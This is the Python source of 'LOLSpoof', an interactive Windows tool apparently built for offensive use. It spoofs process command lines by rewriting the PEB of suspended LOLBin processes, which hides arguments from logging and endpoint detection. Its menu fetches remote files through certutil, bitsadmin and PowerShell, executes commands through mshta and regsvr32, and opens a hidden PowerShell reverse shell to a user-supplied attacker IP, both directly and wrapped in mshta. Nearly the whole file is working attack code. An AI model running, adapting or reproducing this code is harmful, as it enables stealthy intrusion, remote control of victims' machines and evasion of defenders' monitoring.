import os
import ctypes
import shutil
import subprocess
from ctypes import wintypes

# credits to https://github.com/itaymigdal
# Constants

banner = """
      _           _ _ _           _           
     | |         | (_) |         | |          
  __ | | ___  ___| |_| |_   _  __| | ___  ___ 
 / _` |/ _ \/ __| | | | | | |/ _` |/ _ \/ __|
| (_| |  __/ (__| | | | |_| | (_| |  __/\__ \\
 \__,_|\___|\___|_|_|_|\__,_|\__,_|\___||___/

    An interactive shell to spoof some LOLBins
    try !help
"""

help_msg = """    

    !exit        -> Exit 
    !cls         -> Clear the screen
    !help        -> This help message
    !download    -> Download a file using a LOLBin
    !execute     -> Execute a command using a LOLBin
    !spawn       -> Spawn a reverse shell using a LOLBin
"""

prompt = "[LOLSpoof] > "

# Windows API structures and constants
class STARTUPINFO(ctypes.Structure):
    _fields_ = [('cb', wintypes.DWORD),
                ('lpReserved', wintypes.LPWSTR),
                ('lpDesktop', wintypes.LPWSTR),
                ('lpTitle', wintypes.LPWSTR),
                ('dwX', wintypes.DWORD),
                ('dwY', wintypes.DWORD),
                ('dwXSize', wintypes.DWORD),
                ('dwYSize', wintypes.DWORD),
                ('dwXCountChars', wintypes.DWORD),
                ('dwYCountChars', wintypes.DWORD),
                ('dwFillAttribute', wintypes.DWORD),
                ('dwFlags', wintypes.DWORD),
                ('wShowWindow', wintypes.WORD),
                ('cbReserved2', wintypes.WORD),
                ('lpReserved2', ctypes.LPBYTE),
                ('hStdInput', wintypes.HANDLE),
                ('hStdOutput', wintypes.HANDLE),
                ('hStdError', wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [('hProcess', wintypes.HANDLE),
                ('hThread', wintypes.HANDLE),
                ('dwProcessId', wintypes.DWORD),
                ('dwThreadId', wintypes.DWORD)]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [('ExitStatus', wintypes.LONG),
                ('PebBaseAddress', ctypes.c_void_p),
                ('AffinityMask', wintypes.ULONG),
                ('BasePriority', wintypes.LONG),
                ('UniqueProcessId', wintypes.ULONG),
                ('InheritedFromUniqueProcessId', wintypes.ULONG)]

# Function prototypes
CreateProcessW = ctypes.windll.kernel32.CreateProcessW
CreateProcessW.argtypes = [wintypes.LPWSTR, wintypes.LPWSTR, ctypes.c_void_p, ctypes.c_void_p,
                           wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, wintypes.LPWSTR,
                           ctypes.POINTER(STARTUPINFO), ctypes.POINTER(PROCESS_INFORMATION)]
CreateProcessW.restype = wintypes.BOOL

NtQueryInformationProcess = ctypes.windll.ntdll.NtQueryInformationProcess
NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, ctypes.c_void_p, wintypes.ULONG, ctypes.POINTER(wintypes.ULONG)]
NtQueryInformationProcess.restype = wintypes.LONG

ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype = wintypes.BOOL

WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype = wintypes.BOOL

ResumeThread = ctypes.windll.kernel32.ResumeThread
ResumeThread.argtypes = [wintypes.HANDLE]
ResumeThread.restype = wintypes.DWORD

WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
WaitForSingleObject.restype = wintypes.DWORD

def onexit():
    exit(0)

def execute_spoofed_lolbin(real_cmdline):
    binary = real_cmdline.split(" ")[0]
    args_len = len(real_cmdline) - len(binary)
    spoofed_cmdline = binary + ' ' * args_len
    real_cmdline = real_cmdline.encode('utf-16le')
    spoofed_cmdline = spoofed_cmdline.encode('utf-16le')

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()

    if not CreateProcessW(None, spoofed_cmdline, None, None, False, 0x4, None, None, ctypes.byref(si), ctypes.byref(pi)):
        return False

    bi = PROCESS_BASIC_INFORMATION()
    ret_len = wintypes.ULONG()

    if NtQueryInformationProcess(pi.hProcess, 0, ctypes.byref(bi), ctypes.sizeof(bi), ctypes.byref(ret_len)) != 0:
        return False

    peb_address = bi.PebBaseAddress
    process_parameters_offset = peb_address + 0x20
    process_parameters_address = ctypes.c_void_p()

    if not ReadProcessMemory(pi.hProcess, process_parameters_offset, ctypes.byref(process_parameters_address), ctypes.sizeof(process_parameters_address), None):
        return False

    cmd_line_offset = process_parameters_address.value + 0x70 + 0x8
    cmd_line_address = ctypes.c_void_p()

    if not ReadProcessMemory(pi.hProcess, cmd_line_offset, ctypes.byref(cmd_line_address), ctypes.sizeof(cmd_line_address), None):
        return False

    if not WriteProcessMemory(pi.hProcess, cmd_line_address, real_cmdline, len(real_cmdline), None):
        return False

    ResumeThread(pi.hThread)
    WaitForSingleObject(pi.hThread, -1)
    return True

def handle_special_command(cmd):
    if cmd == "!exit":
        onexit()
    elif cmd == "!cls":
        os.system('cls')
    elif cmd == "!help":
        print(help_msg)
    elif cmd == "!download":
        print("Choose LOLBin for download:")
        print("1. Certutil")
        print("2. Bitsadmin")
        print("3. PowerShell")
        choice = input("[1/2/3]> ").strip()
        url = input("Enter URL to download: ").strip()
        dest = input("Enter destination file path: ").strip()
        if choice == "1":
            execute_spoofed_lolbin(f"certutil -urlcache -split -f {url} {dest}")
        elif choice == "2":
            execute_spoofed_lolbin(f"bitsadmin /transfer mydownloadjob /download /priority high {url} {dest}")
        elif choice == "3":
            execute_spoofed_lolbin(f"powershell -Command Invoke-WebRequest -Uri {url} -OutFile {dest}")
        else:
            print("Invalid choice")
    elif cmd == "!execute":
        print("Choose LOLBin for command execution:")
        print("1. Mshta")
        print("2. Regsvr32")
        choice = input("[1/2]> ").strip()
        cmd_to_execute = input("Enter command to execute: ").strip()
        if choice == "1":
            execute_spoofed_lolbin(f"mshta {cmd_to_execute}")
        elif choice == "2":
            execute_spoofed_lolbin(f"regsvr32 /s /n /u /i:{cmd_to_execute} scrobj.dll")
        else:
            print("Invalid choice")
    elif cmd == "!spawn":
        print("Choose LOLBin to spawn a reverse shell:")
        print("1. PowerShell")
        print("2. Mshta")
        choice = input("[1/2]> ").strip()
        lhost = input("Enter the local host (attacker IP): ").strip()
        lport = input("Enter the local port: ").strip()
        if choice == "1":
            execute_spoofed_lolbin(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")
        elif choice == "2":
            execute_spoofed_lolbin(f"mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\",0)(window.close)")
        else:
            print("Invalid choice")
    else:
        print(f"Could not parse command: {cmd}")

if __name__ == "__main__":
    print(banner)
    while True:
        cmdline = input(prompt).strip()
        if cmdline == "":
            continue
        if cmdline.startswith("!"):
            handle_special_command(cmdline)
            continue

        cmdline_seq = cmdline.split(" ")
        binary = shutil.which(cmdline_seq[0])
        if not binary:
            print(f"Could not find binary: {cmdline_seq[0]}")
            continue
        cmdline_seq[0] = binary
        cmdline = " ".join(cmdline_seq)

        if not execute_spoofed_lolbin(cmdline):
            print(f"Could not spoof binary: {cmdline_seq[0]}")
